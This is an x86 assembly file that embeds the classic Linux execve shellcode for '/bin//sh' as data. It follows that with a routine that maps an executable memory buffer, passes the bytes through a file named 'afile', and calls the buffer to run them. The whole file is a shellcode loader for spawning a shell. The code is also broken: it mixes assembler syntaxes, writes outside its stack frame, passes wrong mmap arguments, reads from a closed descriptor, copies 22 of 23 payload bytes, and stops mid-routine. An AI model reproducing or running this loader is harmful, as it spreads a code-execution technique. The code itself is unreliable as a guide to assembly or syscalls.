.section .data

shellcode:
    .byte 0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68
    .byte 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x50
    .byte 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80

section .text
global _start

execute_shellcode:
    push ebp
    mov ebp, esp
    sub esp, 16

    ; mmap buffer
    mov dword [ebp - 4], 0      ; addr
    mov dword [ebp - 8], 22     ; size
    mov dword [ebp - 12], 7     ; PROT_READ | PROT_WRITE | PROT_EXEC
    mov dword [ebp - 16], 34    ; MAP_ANONYMOUS | MAP_PRIVATE
    mov dword [ebp - 20], -1    ; fd
    mov eax, 90                 ; SYS_mmap
    lea ebx, [ebp - 20]         ; arg5
    int 0x80                    ; call mmap
    mov dword [ebp - 24], eax   ; save buffer address

    ; open afile
    push dword 0x656c6966      ; "file"
    push dword 0x61            ; "a"
    mov eax, 5                  ; SYS_open
    lea ebx, [esp]              ; filename
    int 0x80                    ; call open
    mov dword [ebp - 28], eax   ; save file descriptor

    ; write "some data" to file
    mov dword [ebp - 8], 10     ; count
    lea ecx, [ebp - 32]         ; buf
    mov edx, dword [ebp - 28]   ; fd
    mov eax, 4                  ; SYS_write
    int 0x80                    ; call write

    ; write shellcode to file
    mov dword [ebp - 8], 22     ; count
    lea ecx, [ebp - 32]         ; buf
    add ecx, 10                 ; skip "some data"
    mov edx, dword [ebp - 28]   ; fd
    mov eax, 4                  ; SYS_write
    int 0x80                    ; call write

    ; close afile
    mov eax, 6                  ; SYS_close
    mov ebx, dword [ebp - 28]   ; fd
    int 0x80                    ; call close

    ; read shellcode into buffer
    mov eax, dword [ebp - 28]   ; fd
    mov ebx, 0                  ; offset
    mov ecx, dword [ebp - 24]   ; buf
    mov edx, 22                 ; count
    mov esi, eax                ; save fd in esi
    mov eax, 3                  ; SYS_read
    int 0x80                    ; call read
    mov dword [ebp - 32], eax   ; save bytes read

    ; call shellcode
    mov ebx, dword [ebp - 24]   ; buf
    call ebx

    ; munmap buffer
    mov ebx, dword [ebp - 24]

